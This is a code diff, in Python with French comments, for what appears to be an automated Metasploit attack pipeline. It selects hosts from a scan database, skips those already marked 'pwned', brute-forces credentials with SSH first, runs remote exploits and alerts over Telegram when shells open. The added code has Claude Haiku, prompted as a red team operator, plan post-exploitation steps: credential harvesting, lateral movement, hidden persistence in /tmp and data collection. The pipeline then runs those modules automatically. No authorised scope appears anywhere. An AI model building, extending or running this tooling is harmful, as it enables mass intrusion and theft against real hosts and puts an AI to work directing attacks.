@@ -44,7 +44,12 @@ PG_USER = os.getenv("PG_USER", "postgres")
 PG_PASSWORD = _read_secret("postgres_password", "PG_PASSWORD")
 PG_DBNAME = os.getenv("PG_DBNAME", "msf")
 
-MODE_RUN = int(os.getenv("MODE_RUN", "1"))
+MODE_RUN  = int(os.getenv("MODE_RUN",  "1"))
+SCAN_MODE = os.getenv("SCAN_MODE", "normal")   # normal | debug
+READ_MODE = os.getenv("READ_MODE", "random")   # random | sequential
+
+_seq_cursor: int       = 0    # curseur offset pour lecture séquentielle
+_seq_total:  int|None  = None  # total hôtes dispo (recalculé après reset)
 
 DEFECTDOJO_URL     = 'http://defectdojo-nginx:8080'
 DEFECTDOJO_TOKEN   = _read_secret("dojo_api_token")
@@ -983,24 +988,97 @@ def mark_uzi_result(host_id: int, address: str, status: str,
         print(f"[ERREUR] mark_uzi_result: {e}")
 
 
-def get_all_debug_hosts():
-    """Sélectionne un hôte classifié par bm12_v3 avec des produits identifiés, non encore traité par uzi."""
+def pick_next_host():
+    """
+    Sélectionne la prochaine cible selon SCAN_MODE et READ_MODE.
+
+    SCAN_MODE=normal  → exclut uniquement les 'pwned' (retente tried/error)
+    SCAN_MODE=debug   → exclut les hôtes déjà traités sans erreur (strict)
+
+    READ_MODE=random      → TABLESAMPLE SYSTEM(0.5) sur hosts (normal) ou
+                            ORDER BY RANDOM() sur host_debug (debug, table petite)
+    READ_MODE=sequential  → ORDER BY id OFFSET curseur global;
+                            retourne None + reset quand liste épuisée.
+
+    Retourne (host_id, address, scan_details) ou None.
+    """
+    global _seq_cursor, _seq_total
+
     try:
-        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST, port=PG_PORT) as conn:
+        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD,
+                              host=PG_HOST, port=PG_PORT) as conn:
             with conn.cursor() as cur:
-                cur.execute(
-                    "SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
-                    "WHERE scan_status = 'bm12_v3' "
-                    "AND scan_details IS NOT NULL "
-                    "AND (scan_details::jsonb) ? 'products' "
-                    "AND host(address::inet) NOT LIKE 'fe80:%%' "
-                    "AND id NOT IN (SELECT host_id FROM uzi_scan_log WHERE status != 'error') "
-                    "LIMIT 1;"
-                )
-                return cur.fetchall()
+
+                # ── Mode DEBUG : lecture depuis host_debug ─────────────────
+                if SCAN_MODE == "debug":
+                    table = "host_debug"
+                    count_q = f"SELECT COUNT(*) FROM {table}"
+                    if READ_MODE == "sequential":
+                        if _seq_total is None:
+                            cur.execute(count_q)
+                            _seq_total = cur.fetchone()[0]
+                            print(f"[SEQ/DEBUG] {_seq_total} hôtes dans host_debug")
+                        if _seq_total == 0 or _seq_cursor >= _seq_total:
+                            print(f"[SEQ/DEBUG] Fin de liste ({_seq_cursor}/{_seq_total}) → reset")
+                            _seq_cursor = 0
+                            _seq_total  = None
+                            return None
+                        cur.execute(
+                            f"SELECT id, address FROM {table} ORDER BY id LIMIT 1 OFFSET {_seq_cursor}"
+                        )
+                        _seq_cursor += 1
+                    else:
+                        # host_debug est une petite table → ORDER BY RANDOM() OK
+                        cur.execute(f"SELECT id, address FROM {table} ORDER BY RANDOM() LIMIT 1")
+
+                    row = cur.fetchone()
+                    if not row:
+                        return None
+                    hid, addr = row
+                    # Récupérer scan_details depuis hosts si l'adresse y existe
+                    cur.execute(
+                        "SELECT scan_details FROM hosts WHERE host(address::inet) = %s LIMIT 1",
+                        (str(addr),)
+                    )
+                    sd_row = cur.fetchone()
+                    scan_details_raw = sd_row[0] if sd_row else None
+                    return (hid, addr, scan_details_raw)
+
+                # ── Mode NORMAL : lecture depuis hosts ─────────────────────
+                else:
+                    base_where = (
+                        "scan_status = 'bm12_v3' "
+                        "AND scan_details IS NOT NULL "
+                        "AND (scan_details::jsonb) ? 'products' "
+                        "AND host(address::inet) NOT LIKE 'fe80:%%' "
+                        "AND id NOT IN "
+                        "  (SELECT host_id FROM uzi_scan_log WHERE status = 'pwned')"
+                    )
+                    if READ_MODE == "sequential":
+                        if _seq_total is None:
+                            cur.execute(f"SELECT COUNT(*) FROM hosts WHERE {base_where}")
+                            _seq_total = cur.fetchone()[0]
+                            print(f"[SEQ/NORMAL] {_seq_total} hôtes disponibles")
+                        if _seq_total == 0 or _seq_cursor >= _seq_total:
+                            print(f"[SEQ/NORMAL] Fin de liste ({_seq_cursor}/{_seq_total}) → reset")
+                            _seq_cursor = 0
+                            _seq_total  = None
+                            return None
+                        cur.execute(
+                            f"SELECT id, address, scan_details FROM hosts "
+                            f"WHERE {base_where} ORDER BY id LIMIT 1 OFFSET {_seq_cursor}"
+                        )
+                        _seq_cursor += 1
+                    else:
+                        cur.execute(
+                            f"SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
+                            f"WHERE {base_where} LIMIT 1"
+                        )
+                    return cur.fetchone()
+
     except psycopg2.Error as e:
-        print(f"[ERREUR] get_all_debug_hosts: {e}")
-        return []
+        print(f"[ERREUR] pick_next_host: {e}")
+        return None
 
 
 
@@ -1147,7 +1225,10 @@ def run_bruteforce_phase(client, host, services, attack_surface_vulns, upgraded_
     """
     attempted_modules = set()
 
-    for port, svc_name, *_ in services:
+    # SSH en premier : si port 22/2222 ouvert, tester les credentials avant tout le reste
+    ssh_first = sorted(services, key=lambda s: (0 if s[0] in {22, 2222} else 1, s[0]))
+
+    for port, svc_name, *_ in ssh_first:
         svc = (svc_name or '').lower()
 
         for cfg_name, cfg in BRUTE_MODULES.items():
@@ -1297,6 +1378,122 @@ def handle_new_sessions(client, sessions, upgraded_sessions, host):
         send_telegram_alert(new_shells, str(host))
 
 
+def ai_post_exploitation_plan(session_info: dict, services: list, scan_details: dict) -> list:
+    """
+    Demande à Claude Haiku un plan d'action MITRE ATT&CK après obtention d'une session.
+    Retourne jusqu'à 5 actions triées par priorité.
+    """
+    if not _anthropic_sdk:
+        return []
+    api_key = os.getenv("ANTHROPIC_API_KEY") or read_secret("anthropic_api_key")
+    if not api_key:
+        return []
+
+    context = {
+        "sysinfo":  session_info.get("_sysinfo", "")[:400],
+        "uid":      session_info.get("_getuid", ""),
+        "platform": session_info.get("platform", ""),
+        "arch":     session_info.get("arch", ""),
+        "services": [(p, s) for p, s, *_ in services[:15]],
+        "products": [
+            p.get("name", p) if isinstance(p, dict) else str(p)
+            for p in scan_details.get("products", [])[:10]
+        ],
+        "os":       scan_details.get("os", ""),
+        "type":     scan_details.get("type", ""),
+    }
+    try:
+        client_ai = _anthropic_sdk.Anthropic(api_key=api_key)
+        resp = client_ai.messages.create(
+            model="claude-haiku-4-5-20251001",
+            max_tokens=600,
+            messages=[{
+                "role": "user",
+                "content": (
+                    "You are a red team operator. A Metasploit session is open on the host below.\n"
+                    "Suggest the next 5 post-exploitation steps using MITRE ATT&CK tactics.\n"
+                    "Prioritize: privilege escalation, credential harvesting, lateral movement, "
+                    "discreet persistence (files in /tmp with innocuous names), data collection.\n"
+                    f"Context:\n{json.dumps(context, indent=2)}\n\n"
+                    "Return a JSON array only (no markdown):\n"
+                    '[{"tactic":"TAxxxx","technique":"Txxxx","name":"short name",'
+                    '"msf_module":"post/xxx/yyy","priority":1}]\n'
+                    "Use real Metasploit post/ or auxiliary/ module names. "
+                    "Leave msf_module empty if no MSF module exists."
+                ),
+            }],
+        )
+        raw = resp.content[0].text.strip()
+        start, end = raw.find('['), raw.rfind(']') + 1
+        actions = json.loads(raw[start:end] if start >= 0 and end > start else raw)
+        print(f"[AI-POST] {len(actions)} tactiques: {[a.get('name','?') for a in actions]}")
+        return actions[:5]
+    except Exception as e:
+        print(f"[AI-POST] Erreur: {e}")
+        return []
+
+
+def run_post_exploitation(client, session_id, host: str,
+                          session_info: dict, services: list, scan_details: dict):
+    """
+    Post-exploitation guidée par LLM après obtention d'une session active.
+    1. État des lieux (sysinfo/getuid si pas encore collectés)
+    2. Appel LLM pour plan d'action MITRE ATT&CK
+    3. Exécution séquentielle des modules MSF recommandés
+    """
+    print(f"\n[POST-EXP] ── Session {session_id} sur {host} ──")
+
+    # Enrichir session_info si le sysinfo n'a pas encore été collecté
+    if not session_info.get("_sysinfo"):
+        try:
+            sess = client.sessions.session(session_id)
+            session_info["_sysinfo"] = (sess.run_with_output("sysinfo", timeout=10) or "").strip()
+            session_info["_getuid"]  = (sess.run_with_output("getuid",  timeout=10) or "").strip()
+            session_info["_getpid"]  = (sess.run_with_output("getpid",  timeout=10) or "").strip()
+            print(f"[POST-EXP] {session_info['_sysinfo'][:120]}")
+            print(f"[POST-EXP] UID: {session_info['_getuid']}")
+        except Exception as e:
+            print(f"[POST-EXP] Enrichissement échoué: {e}")
+
+    actions = ai_post_exploitation_plan(session_info, services, scan_details)
+    if not actions:
+        print("[POST-EXP] Pas de recommandations LLM — skip")
+        return
+
+    console_post = client.consoles.console()
+    try:
+        for action in actions:
+            tactic = action.get("tactic", "?")
+            tech   = action.get("technique", "?")
+            name   = action.get("name", "?")
+            module = (action.get("msf_module") or "").strip()
+            suffix = f" ({module})" if module else ""
+            print(f"[POST-EXP] {tactic} {tech} — {name}{suffix}")
+
+            if not module or '/' not in module:
+                continue
+
+            parts    = module.split('/')
+            mod_type = parts[0]          # post | auxiliary | exploit
+            mod_name = '/'.join(parts[1:])
+            try:
+                m = client.modules.use(mod_type, mod_name)
+                try:
+                    m['SESSION'] = session_id
+                except Exception:
+                    pass
+                output = console_post.run_module_with_output(m, timeout=60)
+                short  = (output or '').strip().replace('\n', ' ')[:250]
+                print(f"  → {short}")
+            except Exception as e:
+                print(f"  → Erreur {module}: {e}")
+    finally:
+        try:
+            console_post.destroy()
+        except Exception:
+            pass
+
+
 # Boucle principale
 def main():
     pg_ip = get_postgres_ip()
@@ -1335,27 +1532,27 @@ def main():
 
     while True:
 
-     debug_hosts = get_all_debug_hosts()
-     if not debug_hosts:
-        print("[INFO] Aucun hôte bm12_v3 disponible — retry dans 60s.")
-        time.sleep(60)
+     row = pick_next_host()
+     if row is None:
+        wait = 30 if READ_MODE == "sequential" else 60
+        print(f"[INFO] Aucun hôte disponible (SCAN_MODE={SCAN_MODE}, READ_MODE={READ_MODE}) — pause {wait}s.")
+        time.sleep(wait)
         continue
-     print(f"[DEBUG] {len(debug_hosts)} hôte(s) bm12_v3 à traiter.")
-     debug_index = 0
      upgraded_sessions = set()
      min_date = "2000-01-01"
      console_id = client.consoles.console().cid
      console = client.consoles.console(console_id)
-     host_id, host, scan_details_raw = debug_hosts[debug_index]
-     debug_index += 1
+     host_id, host, scan_details_raw = row
      scan_details = json.loads(scan_details_raw) if isinstance(scan_details_raw, str) else (scan_details_raw or {})
      products = scan_details.get('products', [])
-     print(f"[DEBUG] Cible {debug_index}/{len(debug_hosts)} : {host} | produits: {[p['name'] for p in products]}")
+     seq_info = f" [seq:{_seq_cursor}]" if READ_MODE == "sequential" else ""
+     prod_names = [p.get('name', p) if isinstance(p, dict) else str(p) for p in products]
+     print(f"[INFO] Cible: {host}{seq_info} | mode={SCAN_MODE}/{READ_MODE} | produits: {prod_names}")
      services = get_host_services_by_address(str(host))
      if not services:
-         print(f"[DEBUG] Aucun service connu pour {host} — skip.")
+         print(f"[INFO] Aucun service connu pour {host} — skip.")
          continue
-     print(f"[DEBUG] {len(services)} services: {[(p, s) for p, s, *_ in services]}")
+     print(f"[INFO] {len(services)} services: {[(p, s) for p, s, *_ in services]}")
      os_name = get_host_os(str(host)) or 'Linux'
      # Forcer le type bm12 si classifié (iot_embedded, vuln_web)
      host_type = scan_details.get('type', '')
@@ -1570,17 +1767,31 @@ def main():
                          break  # session ouverte — inutile d'essayer d'autres payloads
          check_con.destroy()
 
-     # Phase 0 : brute-force credentials sur tous les services détectés
+     # Phase 0 : brute-force credentials (SSH en priorité si port 22 ouvert)
      attack_surface_vulns = {v['vuln'] for v in scan_details.get('attack_surface', [])}
      if services:
-         print(f"\n[PHASE 0] Brute-force credentials sur {host}")
+         ssh_open = any(p in {22, 2222} for p, *_ in services)
+         print(f"\n[PHASE 0] Brute-force credentials sur {host}"
+               + (" [SSH prioritaire]" if ssh_open else ""))
          run_bruteforce_phase(client, host, services, attack_surface_vulns, upgraded_sessions, stats)
+
+     # Post-exploitation guidée LLM sur sessions obtenues en Phase 0
+     for sid, sinfo in list(client.sessions.list.items()):
+         if sid not in upgraded_sessions:
+             run_post_exploitation(client, sid, str(host), dict(sinfo), services, scan_details)
+             upgraded_sessions.add(sid)
 
      # Phase 1 : exploits remote (accès initial)
      print(f"\n[PHASE 1] Exploits remote sur {host}")
      _run_exploit_list(remote_exploits)
 
-     # Phase 2 : post-exploitation si au moins une session active
+     # Post-exploitation guidée LLM sur nouvelles sessions obtenues en Phase 1
+     for sid, sinfo in list(client.sessions.list.items()):
+         if sid not in upgraded_sessions:
+             run_post_exploitation(client, sid, str(host), dict(sinfo), services, scan_details)
+             upgraded_sessions.add(sid)
+
+     # Phase 2 : exploits locaux/post si sessions actives
      sessions_after_p1 = client.sessions.list
      if sessions_after_p1 and post_exploits:
          sid_p2 = int(next(iter(sessions_after_p1)))
